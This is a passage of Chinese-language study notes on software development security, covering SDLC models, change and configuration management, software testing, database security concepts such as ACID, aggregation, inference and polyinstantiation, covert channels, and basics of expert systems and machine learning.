描述系统应该采取什么行动以响应不同输入的业务逻辑</p><p><strong>输出</strong>  函数提供的数据</p><p>功能需求文档需要所有相关利益方都同意。</p><p>开发过程中不断参考功能需求文档。</p><p>测试和评估阶段，会用功能需求文档作为检查表。</p><h3 id="3-控制规范的制订"><a href="#3-控制规范的制订" class="headerlink" title="3.控制规范的制订"></a>3.控制规范的制订</h3><p>控制规范的制订阶段，开始与功能需求确定阶段之后，在设计审查阶段持续进行。</p><p>从多个安全角度对系统进行分析：</p><ul><li>足够的访问控制</li><li>使用正确的加密和数据保护技术保护关键数据的保密性</li><li>提供审计踪迹来实施个人问责制</li><li>提供对非法活动检测机制</li><li>必须解决可用性和容错问题</li></ul><p>安全性设计不是一次性的，必须主动持续进行。</p><p>设计规范改动、组件改变，都需要参考安全需求或修改。</p><h3 id="4-设计审查"><a href="#4-设计审查" class="headerlink" title="4.设计审查"></a>4.设计审查</h3><p>审计管理团队为不同团队布置具体任务，并设定编码重要节点的初步完成时间。</p><p>设计团队完成正式的设计文档后应该和相关利益方进行审查，确保所有人认可。</p><p>安全人员也参与，验证控制规范制定阶段制定的规范是否符合。</p><h3 id="5-编码"><a href="#5-编码" class="headerlink" title="5.编码"></a>5.编码</h3><p>开发人员应该使用安全软件编码原则来编写符合设计并满足用户需求的代码。</p><h3 id="6-代码审查演练"><a href="#6-代码审查演练" class="headerlink" title="6.代码审查演练"></a>6.代码审查演练</h3><p>多次对特定模块的代码副本进行演练，寻找逻辑流问题或其他设计&#x2F;安全性缺陷。</p><p>确保都按规范开发代码。</p><h3 id="7-系统测试审查"><a href="#7-系统测试审查" class="headerlink" title="7.系统测试审查"></a>7.系统测试审查</h3><p>系统永远都不可能完成。</p><p>初始系统测试：找出明显错误</p><p>场景验证系统：模拟常见和不常见的用户活动</p><p>回归测试：使验证过程正式化。</p><p>测试应该包括功能测试和安全测试。</p><p>与任何关键的开发过程一样，务必保存一份书面测试计划和测试结果，可供将来审查。</p><h3 id="8-维护和变更管理"><a href="#8-维护和变更管理" class="headerlink" title="8.维护和变更管理"></a>8.维护和变更管理</h3><p>必须拥有一支经验丰富、能处理常规或意外维护任务的支持团队。</p><p>任何代码的变更都要通过正式的变更管理流程来进行。</p><h2 id="20-1-3-生命周期模型"><a href="#20-1-3-生命周期模型" class="headerlink" title="20.1.3 生命周期模型"></a>20.1.3 生命周期模型</h2><p>SDLC 软件开发生命周期模型</p><p>务必验证软件开发生命周期模型是否被正确实施以及是否适合环境。</p><p>实施 SDLC 模型的初始步骤之一包括获得管理层的批准。</p><h3 id="1-瀑布模型"><a href="#1-瀑布模型" class="headerlink" title="1.瀑布模型"></a>1.瀑布模型</h3><p>1970 年开发。</p><p>目的在于将系统开发生命周期视为一系列连续的活动。</p><p>瀑布模型包含 7 个发展阶段，完成进入下一阶段。</p><p>迭代瀑布模型允许开发返回前一阶段，以纠正后续阶段发现的缺陷，被称为反馈回路特性。</p><p>系统需求</p><p>软件需求</p><p>初步设计</p><p>详细设计</p><p>编码调试</p><p>测试</p><p>运营维护</p><p>问题：</p><p>只允许开发人员在软件开发过程中后退一个阶段。</p><p>每个阶段都需要进行确认和验证步骤来该井瀑布模型。</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/image-20250617093037268.png" alt="image-20250617093037268"></p><h3 id="2-螺旋模型"><a href="#2-螺旋模型" class="headerlink" title="2.螺旋模型"></a>2.螺旋模型</h3><p>1988 年出现螺旋模型。</p><p>螺旋模型封装了许多迭代的其他模型（也就是瀑布模型），所以螺旋模型也被称为元模型或“模型的模型”</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/image-20250617093212635.png" alt="image-20250617093212635"></p><p>螺旋的每次“回路”都导致新系统原型的开发。</p><p>螺旋模型为瀑布模型受到的主要批评提供了一个解决方案，也就是说，如果技术需求和客户需求发生变化，需要改进系统时，允许开发人员回到计划编制阶段。</p><h3 id="3-敏捷软件开发"><a href="#3-敏捷软件开发" class="headerlink" title="3.敏捷软件开发"></a>3.敏捷软件开发</h3><p>敏捷软件开发宣言的 12 条原则：</p><ul><li>首要目标，是通过持续不断地及早交付有价值的软件来使客户满意。</li><li>欢迎变更需求，即使在开发后期也一样。为了客户的竞争优势，敏捷过程将利用变化。</li><li>经常交付可工作的软件，相隔几星期或一两个月，倾向于采用较短的周期。</li><li>项目中业务人员和开发人员必须每天合作</li><li>以积极的人员为核心搭建项目，提供所需的环境和支援，相信他们能达成目标。</li><li>在团队内外，传递信息最高效的方式是面对面交谈。</li><li>可工作的软件是度量进度的首要标准。</li><li>敏捷过程倡导可持续开发。</li><li>坚持不懈地追求卓越技术和良好设计，以增强敏捷性。</li><li>以简洁为本，极力减少不必要的工作量。</li><li>最好的架构、需求和设计出自组团队。</li><li>团队定期反思如何提高成效，并依此调整其行为。</li></ul><p>团队接受敏捷宣言的原则，并定期开会审查和计划工作。</p><p>敏捷开发是一种哲学，而不是一种特定的方法。</p><p>Scrum、看板、快速应用程序开发（RAD）、敏捷统一过程（AUP）、动态系统开发模型（DSDM）和极限编程（XP）。</p><p>Scrum 最受欢迎，每天会议，计划第二天工作，将工作组织为短时间的活动冲刺。</p><h3 id="4-能力成熟度模型-SW-CMM"><a href="#4-能力成熟度模型-SW-CMM" class="headerlink" title="4.能力成熟度模型 SW-CMM"></a>4.能力成熟度模型 SW-CMM</h3><p>软件能力成熟度模型 （Software Capability Maturity Model，SW-CMM、CMM、SCMM）</p><p>主张所有从事软件开发的组织都将依此经历不同的成熟阶段。</p><p>目的在于通过将临时的、混乱的软件开发过程发展为成熟的、规范的软件过程。</p><p>SW-CMM 背后的理念是软件的质量依赖于其开发过程的质量。</p><h4 id="SW-CMM-阶段"><a href="#SW-CMM-阶段" class="headerlink" title="SW-CMM 阶段"></a>SW-CMM 阶段</h4><h5 id="第-1-阶段：初始级"><a href="#第-1-阶段：初始级" class="headerlink" title="第 1 阶段：初始级"></a>第 1 阶段：初始级</h5><p>该阶段几乎或完全没有定义软件开发过程。</p><h5 id="第-2-阶段：可重复级"><a href="#第-2-阶段：可重复级" class="headerlink" title="第 2 阶段：可重复级"></a>第 2 阶段：可重复级</h5><p>引入基本的生命周期过程。</p><p>开始重用代码，以及出现重复的结果。</p><p>可重复级的关键过程域定义为：</p><p>需求管理、软件项目计划编制、软件项目跟踪和监督、软件转包合同管理、软件质量保障和软件配置管理。</p><h5 id="第-3-阶段：定义级"><a href="#第-3-阶段：定义级" class="headerlink" title="第 3 阶段：定义级"></a>第 3 阶段：定义级</h5><p>依照一系列正式的、文档化的软件开发过程进行操作。</p><p>所有开发项目都在新的标准化管理模型的制约下进行，</p><p>定义级别的关键过程域定义为：</p><p>组织过程关注点、组织过程定义、培训计划、集成软件管理、软件产品工程、组间协调和同行评审。</p><h5 id="第-4-阶段：管理级"><a href="#第-4-阶段：管理级" class="headerlink" title="第 4 阶段：管理级"></a>第 4 阶段：管理级</h5><p>使用定量方法来详细了解开发过程。</p><p>管理级的关键过程域定义为：</p><p>定量过程管理和软件质量管理。</p><h5 id="第-5-阶段：优化级"><a href="#第-5-阶段：优化级" class="headerlink" title="第 5 阶段：优化级"></a>第 5 阶段：优化级</h5><p>优化级采取持续改进的过程。</p><p>成熟的软件开发过程已经确立。</p><p>优化级别的关键过程域定义为：</p><p>缺陷预防、技术变更管理和过程变更管理。</p><p>CMM 被能力成熟度模型集成（CMMI）</p><p>CMMI 将第 4 阶段称为“定量管理”，而不是“管理级”</p><p>CMM 关注单独的过程</p><p>CMMI 关注过程的集成。</p><h4 id="软件保证成熟度模型-SAMM"><a href="#软件保证成熟度模型-SAMM" class="headerlink" title="软件保证成熟度模型 SAMM"></a>软件保证成熟度模型 SAMM</h4><p>软件保证成熟度模型SAMM 由 OWASP 维护的开源项目。</p><p>软件保证成熟度模型 SAMM 提供一个框架，将安全活动集成到软件开发和维护过程中，并为组织提供评估其成熟度的能力。</p><p>软件保证成熟度 模型 SAMM  划分为五个业务功能：</p><p><strong>治理</strong></p><p>组织为管理软件开发过程而进行的活动，包括：战略、指标、策略、合规、教育和指导实践</p><p><strong>设计</strong></p><p>组织用于定义软件需求和创建软件的过程。包括：威胁建模、威胁评估、安全需求和安全架构的实践。</p><p><strong>实施</strong></p><p>构建和部署软件组件以及管理这些组件中的缺陷的过程。包括：安全构建、安全部署和缺陷管理实践。</p><p><strong>验证</strong></p><p>组织为确认代码满足业务和安全要求而进行的活动。包括：架构分析、需求-驱动测试和安全测试</p><p><strong>运营</strong></p><p>在代码发布后，组织为整个软件生命周期中维护安全性而采取的行动。包括：事件管理、环境管理和运营管理。</p><h3 id="5-IDEAL-模型"><a href="#5-IDEAL-模型" class="headerlink" title="5.IDEAL 模型"></a>5.IDEAL 模型</h3><p>软件工程协会 SEI 为软件开发确认 IDEAL 模型，实现了多个 SW-CMM 属性。</p><p>IDEAL 模型包括下列 5 个阶段：</p><p><strong>（1）启动</strong>  概述更改的业务原因，为启动提供支持，并准备好恰当的基础设施。</p><p><strong>（2）诊断</strong>  在诊断阶段，分析组织的当前状态，给出一般性变更建议。</p><p><strong>（3）建立</strong>  在建立阶段，采用诊断阶段的一般建议，并且开发帮助实现变更的具体行动计划。</p><p><strong>（4）行动</strong>  在行动阶段，停止“讨论”，开始“执行”，组织制定解决方案，随后测试、改进和实施解决方案。</p><p><strong>（5）学习</strong>  与任何质量改进过程一样，组织必须不断分析努力的结果，从而确定是否已实现预期的目标，必要时建议采取新的行动，使组织重返正轨。</p><h3 id="SW-CMM-模型和-IDEAL-模型记忆方法"><a href="#SW-CMM-模型和-IDEAL-模型记忆方法" class="headerlink" title="SW-CMM 模型和 IDEAL 模型记忆方法"></a>SW-CMM 模型和 IDEAL 模型记忆方法</h3><table><thead><tr><th>IDEAL 模型</th><th>SW-CMM 模型</th></tr></thead><tbody><tr><td>Initiating 启动</td><td>Initiating 初始</td></tr><tr><td>Diagnosing 诊断</td><td>Repeatable 可重复</td></tr><tr><td>Establishing 建立</td><td>Defined 定义</td></tr><tr><td>Acting 行动</td><td>Managed 管理（量化管理）</td></tr><tr><td>Learing 学习</td><td>Optimized 优化</td></tr></tbody></table><h2 id="20-1-4-甘特图和-PERT"><a href="#20-1-4-甘特图和-PERT" class="headerlink" title="20.1.4 甘特图和 PERT"></a>20.1.4 甘特图和 PERT</h2><h3 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a>甘特图</h3><p>是一种显示项目和调度之间随时间变化的相互关系的条形图，提供了帮助计划、协调和跟踪项目中特定任务调度的图表说明。</p><p><img src="/2024/12/24/informationCocoon/tk_group_message/+%E5%9F%9F8%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8-%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8/image-20250617220121695.png" alt="image-20250617220121695"></p><h3 id="PERT"><a href="#PERT" class="headerlink" title="PERT"></a>PERT</h3><p>计划评审技术 PERT 是一种项目调度工具，用于在开发中判断软件产品的规模并为风险评估计算标准偏差（standard deviation，SD）。</p><p>计划评审技术 PERT 图表清楚显示了不同项目任务之间的依赖关系。</p><p>项目经理可以使用规模估算和依赖关系管理团队成员的时间和执行任务调度。</p><p>计划评审技术 PERT 用于直接改进项目管理和软件编码，开发出更高效和实际规模更小的软件。</p><h2 id="20-1-5-变更和配置管理"><a href="#20-1-5-变更和配置管理" class="headerlink" title="20.1.5 变更和配置管理"></a>20.1.5 变更和配置管理</h2><p>必须以有组织的方式管理所要求的变更。</p><p>变更必须集中记录，以支持将来的审计、调查、故障排除和分析需求。</p><p>文件完整性监控工具可监控系统发生的变化。</p><h3 id="变更管理流程的-3-个基本组件"><a href="#变更管理流程的-3-个基本组件" class="headerlink" title="变更管理流程的 3 个基本组件"></a>变更管理流程的 3 个基本组件</h3><h4 id="请求控制"><a href="#请求控制" class="headerlink" title="请求控制"></a>请求控制</h4><p>提供一个有组织的框架，框架内，用户可以请求变更；管理者可以进行成本&#x2F;效益分析；开发人员可以优化任务。</p><h4 id="变更控制"><a href="#变更控制" class="headerlink" title="变更控制"></a>变更控制</h4><p>使用变更控制过程来重建用户遭遇的特定情况并分析能进行弥补的适当变更。</p><p>测试变更阶段</p><p>变更控制包括：</p><p>遵守质量控制约束</p><p>开发用于更新或变更部署的工具</p><p>正确记录任何编码变化</p><p>最小化新代码对安全性的负面影响</p><h4 id="发布控制"><a href="#发布控制" class="headerlink" title="发布控制"></a>发布控制</h4><p>完成变更，必须通过发布控制过程来进行发布。</p><p>发布控制中必不可少的步骤：</p><p>仔细审核并确保在变更过程中作为编程辅助插入的任何代码（例如调试代码&#x2F;后门）在软件发布之前已被删除。</p><p>发布控制确保仅对生产系统进行已批准的变更。</p><p>发布控制也包括验收测试。</p><h3 id="软件配置管理-SCM"><a href="#软件配置管理-SCM" class="headerlink" title="软件配置管理 SCM"></a>软件配置管理 SCM</h3><p>软件配置管理过程用于控制整个组织范围内使用的软件版本，并且正式跟踪和控制对软件配置的变更。</p><p>软件配置管理 SCM 包括 4 个主要组件：</p><p><strong>配置标识</strong></p><p>在配置标识过程中，管理员记录整个组织范围内的软件产品配置。</p><p><strong>配置控制</strong></p><p>配置控制确保对软件版本的变更与变更控制和配置管理策略一致。</p><p>只有符合策略的授权分发能执行更新操作。</p><p><strong>配置状态统计</strong></p><p>用于跟踪发生的所有授权变更的正规过程。</p><p><strong>配置审计</strong></p><p>定期的配置审计能够确保实际的生产环境与统计记录一致，并确保没有发生未授权的配置变更。</p><h2 id="20-1-6-DevOps"><a href="#20-1-6-DevOps" class="headerlink" title="20.1.6 DevOps"></a>20.1.6 DevOps</h2><p>DevOps 方法通过将开发、测试和运营三种职能集中在一个运营模型中来解决问题。</p><p>DevOps 和 敏捷开发方法相互配合，大幅缩短开发、测试和部署软件所需的时间。</p><p>开发和运营的紧密集成也要同时集成安全控制，也就是 DevSecOps 。</p><h2 id="20-1-7-应用编程接口"><a href="#20-1-7-应用编程接口" class="headerlink" title="20.1.7 应用编程接口"></a>20.1.7 应用编程接口</h2><p>API 必须考虑身份认证</p><p>必须知道何时需要身份认证，并确保验证每个 API 调用的凭证和授权，可以通过 API 密钥实现。</p><p>API 密钥和密码一样重要，需要存储在安全的位置，并在加密通信信道上传输。</p><p>CURL 可以用于向 API 发送请求。</p><p>API 也必须彻底测试安全缺陷。</p><h2 id="20-1-8-软件测试"><a href="#20-1-8-软件测试" class="headerlink" title="20.1.8 软件测试"></a>20.1.8 软件测试</h2><p>组织在内部分发或向市场分发软件前应当对其进行彻底的测试。</p><p>测试机制和测试数据集和产品同时进行设计。</p><p>软件测试需要进行合理性检查，确保符合指定指标的返回值在合理范围之内。</p><p>软件测试应该测试软件产品对正常和非正常的处理。</p><p>测试不能用实际生产数据测试。</p><p>软件测试也需要使用职责分离，让非开发人员进行测试。</p><p>应用软件测试的三种不同的理念：</p><p><strong>白盒测试</strong></p><p>检查程序的内部逻辑结构并逐行执行代码。</p><p>白盒测试人员可以访问源代码。</p><p><strong>黑盒测试</strong></p><p>通过提供广泛的输入场景并查看输出。</p><p>黑盒测试人员不访问源代码。</p><p><strong>灰盒测试</strong></p><p>白盒测试和黑盒测试的组合。</p><h2 id="20-1-9-代码仓库"><a href="#20-1-9-代码仓库" class="headerlink" title="20.1.9 代码仓库"></a>20.1.9 代码仓库</h2><p>存放源代码的中心存储点</p><p>提供版本控制</p><p>错误跟踪</p><p>Web 托管</p><p>发布管理</p><p>可支持软件开发的通信功能。</p><p>代码仓库是可重用的代码包，可以组织内或组织外共享。</p><p>必须适当控制对仓库的访问，仅授予用户适当的读取或写入权限。</p><p>不要把敏感信息放入公共代码仓库。</p><h2 id="20-1-10-服务水平协议-SLA"><a href="#20-1-10-服务水平协议-SLA" class="headerlink" title="20.1.10 服务水平协议 SLA"></a>20.1.10 服务水平协议 SLA</h2><p>服务提供商和供应商都认同的确保组织内向内部和外部客户提供的服务保持适当水平的方法。</p><p>服务水平协议 SLA 涉及的问题：</p><ul><li>系统正常运行时间（如总运行时间的百分比）</li><li>最大持续停机时间（以秒、分钟等为单位）</li><li>高峰负荷</li><li>平均负荷</li><li>责任诊断</li><li>容灾切换时间</li></ul><p>服务水平协议 SLA 包括财务和其他的合约性补偿措施。</p><h2 id="20-1-11-第三方软件采购"><a href="#20-1-11-第三方软件采购" class="headerlink" title="20.1.11 第三方软件采购"></a>20.1.11 第三方软件采购</h2><p>企业购买商用现货 COTS 软件并使其在组织管理的服务器上运行，既可以在本地、也可在 IaaS 环境中。</p><p>有些以软件即服务 SaaS 方式购买交付。</p><p>有些是基于社区的开源软件 OSS 创建维护的。</p><p>任何情况下，都应该关注安全。</p><p>购买和部署软件时，必须正确配置软件以满足安全目标，必须关注安全公告和补丁，及时修复漏洞。</p><p>SaaS 环境下，安全人员需要监控供应商的安全，包括审计、评估、漏洞扫描和旨在验证供应商是否维护适当措施。</p><h1 id="20-2-创建数据库和数据仓储"><a href="#20-2-创建数据库和数据仓储" class="headerlink" title="20.2 创建数据库和数据仓储"></a>20.2 创建数据库和数据仓储</h1><h2 id="20-2-1-数据库管理系统的体系结构"><a href="#20-2-1-数据库管理系统的体系结构" class="headerlink" title="20.2.1 数据库管理系统的体系结构"></a>20.2.1 数据库管理系统的体系结构</h2><p>数据库管理系统 DBMS</p><p>关系数据库管理系统 RDBMS</p><h3 id="1-层次式数据库和分布式数据库"><a href="#1-层次式数据库和分布式数据库" class="headerlink" title="1.层次式数据库和分布式数据库"></a>1.层次式数据库和分布式数据库</h3><h4 id="层次式数据库"><a href="#层次式数据库" class="headerlink" title="层次式数据库"></a>层次式数据库</h4><p>层次式数据模型将关联的记录和字段组合为一个逻辑树结构，形成 “一对多”的数据模型。</p><p>层次数据模型示例：</p><p>域名系统 DNS</p><p>层次数据库以分层方式存储数据。</p><h4 id="分布式数据库"><a href="#分布式数据库" class="headerlink" title="分布式数据库"></a>分布式数据库</h4><p>分布式数据库将数据存储在多个数据库中，数据库是逻辑连接的。</p><p>分布式数据库的数据映射关系是“多对多”的。</p><h3 id="2-关系数据库"><a href="#2-关系数据库" class="headerlink" title="2.关系数据库"></a>2.关系数据库</h3><p>关系数据库是由行和列组成的平面二维表。</p><p>行列结构提供“一对一”数据映射关系。</p><p>面向对象数据库（OODB）的优势：方便代码重用，方便故障分析以及减少整体维护工作量。</p><p>关系中行的数量被视为基数（cardinality），基数经常变</p><p>列的数量被视为度（degree），度不经常变</p><p>属性的域（domain）是属性可用的一组允许值。</p><p>定义表之间的关系以标识相关记录。</p><p>记录可使用多种键进行标识。</p><p>键是表中字段的子集，可用于唯一标识记录。</p><p><strong>候选键</strong></p><p>可用于唯一标识表中记录的属性子集，也就是列</p><p>每个表都可能有一个或多个候选键</p><p><strong>主键</strong></p><p>从表的候选键中选出用来唯一标识表中记录的键被称为主键。</p><p>每个表只有一个主键。</p><p>RDBMS 不允许用相同主键插入多个记录，从而强调实施主键的唯一性。</p><p><strong>备用键</strong></p><p>任何未被选择为主键的候选键都是备用键。</p><p><strong>外键</strong></p><p>用于强制在两个表之间建立关系，也叫参照完整性。</p><p>参照完整性确保：如果一个表包含一个外键，那么对应于关系中另一个表内仍然存在的主键。</p><p>SQL 可以通过表、行、列，甚至单独的单元格限制用户访问权限。</p><p><strong>数据库范式</strong></p><p>常见的三种范式：第一范式 1NF，第二范式 2NF，第三范式 3NF</p><p>范式添加的需求：减少表中的冗余，消除错误放置的数据，执行其他许多内置处理任务</p><p>范式是递增的，采用 2NF范式，必须先遵从 1NF 范式。</p><p>数据定义语言 DLL：运行创建和更改数据库的结构</p><p>数据操纵语言 DML：允许用户与模式（数据库的结构）内包含的数据交互</p><h2 id="20-2-2-数据库事务"><a href="#20-2-2-数据库事务" class="headerlink" title="20.2.2 数据库事务"></a>20.2.2 数据库事务</h2><p>关系数据库支持事务的显式和隐式使用，从而确保数据的完整性。</p><p>显式提交：commit 命令</p><p>隐式提交：事务成功结束后进行提交</p><h3 id="关系数据库事务-4-个必需特征-ACID-模型"><a href="#关系数据库事务-4-个必需特征-ACID-模型" class="headerlink" title="关系数据库事务 4 个必需特征 ACID 模型"></a>关系数据库事务 4 个必需特征 ACID 模型</h3><h4 id="原子性（atomicity）"><a href="#原子性（atomicity）" class="headerlink" title="原子性（atomicity）"></a>原子性（atomicity）</h4><p>数据库事务必须是原子的。</p><p>要么全有、有么全无的事务。</p><h4 id="一致性（consistency）"><a href="#一致性（consistency）" class="headerlink" title="一致性（consistency）"></a>一致性（consistency）</h4><p>所有事务都必须在与数据库所有规则一致的环境中开始操作。</p><p>任何事务都不能利用某个事务执行期间可能产生的任何不一致的数据。</p><h4 id="隔离性（isolation）"><a href="#隔离性（isolation）" class="headerlink" title="隔离性（isolation）"></a>隔离性（isolation）</h4><p>隔离性原则要求事务之间彼此独立操作。</p><p>两个同时更改同一数据的事务，在一个事务更改数据前，另一个事务必须完全结束。</p><p>隔离性能够防止一个事务处理另一个事务中途生成的无效数据。</p><h4 id="持久性（durability）"><a href="#持久性（durability）" class="headerlink" title="持久性（durability）"></a>持久性（durability）</h4><p>数据库事务必须是持久的。</p><p>一旦提交给数据库，就会被保留下来。</p><p>数据库通过使用备份机制确保持久性。</p><h2 id="20-2-3-多级数据库的安全性"><a href="#20-2-3-多级数据库的安全性" class="headerlink" title="20.2.3 多级数据库的安全性"></a>20.2.3 多级数据库的安全性</h2><p>设法将具有不同安全需求的数据分开。</p><p>分类级别不同或“因需可知”要求不同的数据混合在一起的情况被称为数据<strong>污染</strong></p><p>部署可信的前端来为旧式的或不安全的 DBMS 添加多级安全性。</p><p>使用视图限制访问，视图只是将数据提供给用户的 SQL 语句。</p><p>允许用户只与受限的试图交互，而不与作为视图基础的原始表交互。</p><h3 id="1-并发性"><a href="#1-并发性" class="headerlink" title="1.并发性"></a>1.并发性</h3><p>并发性或编辑控制是一种预防性安全机制，努力确保存储在数据库中的信息总是正确的，或者至少保护其完整性和可用性。</p><p>不实施并发性的数据可能存在的问题：</p><ul><li><p>丢失更新</p><p>当两个不同的进程更新数据库时，如果不知道对方的活动，就会丢失更新。</p></li><li><p>脏读取</p><p>当进程从没有成功提交的事务中读取记录时，会出现脏读取。</p></li></ul><p>并发性使用“锁定”功能允许已授权用户更改数据，同时拒绝其他用户查看或更改数据，更改完成后，“解锁”功能才允许其他用户访问所需的数据。</p><h4 id="聚合"><a href="#聚合" class="headerlink" title="聚合"></a>聚合</h4><p>聚合是利用 SQL 函数，组合来自一个或多个表的记录，以生成潜在有用的信息。</p><p>必须严格控制对聚合函数的访问并充分评估可能向未授权个人透露的潜在信息。</p><p>使用深度防御、因需可知和最小特权原则结合防止聚合攻击。</p><h4 id="推理"><a href="#推理" class="headerlink" title="推理"></a>推理</h4><p>推理攻击造成的数据安全问题与聚合攻击造成的安全问题类似。</p><p>推理攻击涉及组合多个非敏感信息，以生成应该在更高级别才能访问的信息。</p><p>推理攻击的最佳防御措施：</p><p>对授予单个用户的权限保持持续警惕</p><p>有意模糊数据</p><p>数据分区</p><h3 id="2-其他安全机制"><a href="#2-其他安全机制" class="headerlink" title="2.其他安全机制"></a>2.其他安全机制</h3><h4 id="语义完整性"><a href="#语义完整性" class="headerlink" title="语义完整性"></a>语义完整性</h4><p>语义完整性确保用户的动作不会违反任何结构的规则，同时检查存储的所有数据类型是否都在有效的域范围内，确保只存在逻辑值，并且确认系统遵守所有的唯一性约束。</p><p>可以通过时间和日期标记来维护数据的完整性和可用性。</p><h4 id="细粒度对象控制"><a href="#细粒度对象控制" class="headerlink" title="细粒度对象控制"></a>细粒度对象控制</h4><p>能在数据库内细粒度地控制对象。</p><h5 id="内容相关的访问控制"><a href="#内容相关的访问控制" class="headerlink" title="内容相关的访问控制"></a>内容相关的访问控制</h5><p>基于被访问对象的内容进行控制</p><p>在逐个访问对象的基础上做决定</p><p>内容相关的访问控制增加了处理开销。</p><h5 id="单元抑制"><a href="#单元抑制" class="headerlink" title="单元抑制"></a>单元抑制</h5><p>单元抑制是指隐藏单独的数据库字段或单元对其施加更多的安全约束</p><h5 id="上下文相关的访问控制和内容相关的访问控制"><a href="#上下文相关的访问控制和内容相关的访问控制" class="headerlink" title="上下文相关的访问控制和内容相关的访问控制"></a>上下文相关的访问控制和内容相关的访问控制</h5><p>上下文相关的访问控制的重要因素是每个对象、数据包或字段如何与总体的活动或通信相联系，单个个体看着没问题，较大的上下文关联表现出良性或恶性。</p><h4 id="分区技术"><a href="#分区技术" class="headerlink" title="分区技术"></a>分区技术</h4><p>使用分区技术来防止聚合和推理漏洞。</p><p>数据库分区是把数据分解成多个部分，每个部分有不同的安全级别。</p><h4 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h4><p>如果同一个关系数据库中的两行或多行具有相同的主键元素，但包含用于不同分类级别的不同数据。</p><p>多实例化常被针对某些推理攻击的防范措施，引入额外的存储成本存储针对不同许可级别设计的数据副本。</p><h4 id="噪声和扰动"><a href="#噪声和扰动" class="headerlink" title="噪声和扰动"></a>噪声和扰动</h4><p>在 DBMS 中插入错误的或误导性的数据，从而重定向或阻止信息保密性攻击。</p><p>确保插入数据库中的噪声不会影响业务运营。</p><h2 id="20-2-4-开放数据库互连-ODBC"><a href="#20-2-4-开放数据库互连-ODBC" class="headerlink" title="20.2.4 开放数据库互连  ODBC"></a>20.2.4 开放数据库互连  ODBC</h2><p>开放数据库互联（open database connectivity，ODBC）</p><p>在不必针对交互的每种数据库类型直接进行编程的情况下，允许应用程序与不同类型的数据库通信。</p><p>ODBC 充当了应用程序和后端数据库之间的代理角色。</p><h2 id="20-2-5-NoSQL"><a href="#20-2-5-NoSQL" class="headerlink" title="20.2.5 NoSQL"></a>20.2.5 NoSQL</h2><h3 id="NoSQL-实例"><a href="#NoSQL-实例" class="headerlink" title="NoSQL 实例"></a>NoSQL 实例</h3><ul><li><p>键&#x2F;值存储可能是最简单的数据库形式。</p><p>适用于高速应用程序和非常大的数据集。</p></li><li><p>图数据库存储图形格式的数据，用节点表示关系。</p><p>用于表示任何类型的网络，包括：社交网络、地理位置等</p></li><li><p>文档存储类似键&#x2F;值存储</p><p>使用键存储信息，文档存储的信息比键&#x2F;值存储的复杂。</p><p>常见文档类型包括：XML 和 JSON</p></li></ul><h1 id="20-3-存储器威胁"><a href="#20-3-存储器威胁" class="headerlink" title="20.3 存储器威胁"></a>20.3 存储器威胁</h1><h2 id="对存储资源的非法访问"><a href="#对存储资源的非法访问" class="headerlink" title="对存储资源的非法访问"></a>对存储资源的非法访问</h2><p>使用加密文件系统，该系统只能通过主操作系统才能访问。</p><p>多级安全性环境中，提供充分的控制确保对共享内存和存储器资源设置适当的控制。</p><p>确保某个分类级别的数据对于较低分类级别的用户是不可读的。</p><p>云上存储需要特别注意设置强的默认安全设置，限制公共访问，仔细监视任何允许公共访问的策略变更。</p><h2 id="隐蔽通道攻击"><a href="#隐蔽通道攻击" class="headerlink" title="隐蔽通道攻击"></a>隐蔽通道攻击</h2><p>隐蔽通道攻击准许通过直接或间接地操纵共享存储介质，在两个分类级别之间传输敏感数据，例如向共享的内存或存储写入敏感信息。</p><p>更复杂的隐蔽存储通道可能操纵磁盘的可用空间或文件大小。</p><h1 id="20-4-理解基于知识的系统"><a href="#20-4-理解基于知识的系统" class="headerlink" title="20.4 理解基于知识的系统"></a>20.4 理解基于知识的系统</h1><h2 id="20-4-1-专家系统"><a href="#20-4-1-专家系统" class="headerlink" title="20.4.1 专家系统"></a>20.4.1 专家系统</h2><p>专家系统试图把人类在某个特殊学科累计的知识具体化，并以一致的方式将它们应用于未来的决策。</p><h3 id="专家系统两个主要组件"><a href="#专家系统两个主要组件" class="headerlink" title="专家系统两个主要组件"></a>专家系统两个主要组件</h3><h4 id="知识库"><a href="#知识库" class="headerlink" title="知识库"></a>知识库</h4><p>知识库包含专家系统已知的规则，试图以一系列 if&#x2F;then 语句对人类专家的知识进行编码。</p><h4 id="推理引擎"><a href="#推理引擎" class="headerlink" title="推理引擎"></a>推理引擎</h4><p>推理引擎对知识库中的信息进行分析，从而得到正确的决策。</p><p>使用接口将当前环境的具体内容提供给推理引擎，推理引擎组合使用逻辑推理和模糊逻辑技术，基于过去的经验做出结论。</p><p>专家系统的优劣完全取决于知识库中的数据和推理引擎采用的决策制定算法。</p><p>紧迫情况下，专家系统优点：决策不受情绪影响。</p><h2 id="20-4-2-机器学习-ML"><a href="#20-4-2-机器学习-ML" class="headerlink" title="20.4.2 机器学习 ML"></a>20.4.2 机器学习 ML</h2><p>机器学习（machine learning，ML）技术使用分析能力从数据集中发现知识，而不直接应用人类洞察力。</p><p>机器学习的核心方法是允许计算机直接从数据中分析和学习，从而开发和更新活动模型。</p><p><strong>机器学习技术分为两大类：</strong></p><ul><li>监督学习技术使用标记数据进行训练</li><li>无监学习使用未标记的数据进行训练</li></ul><h2 id="20-4-3-神经网络"><a href="#20-4-3-神经网络" class="headerlink" title="20.4.3 神经网络"></a>20.4.3 神经网络</h2><p>计算单元链用于尝试模仿人脑的生物学推理过程。</p><p>神经网络是机器学习技术的延伸，通常也被称为深度学习或认知系统。</p><p>神经网络的优点：</p><p>线型</p><p>输入-输出映射</p><p>自适应性</p><p>Delta 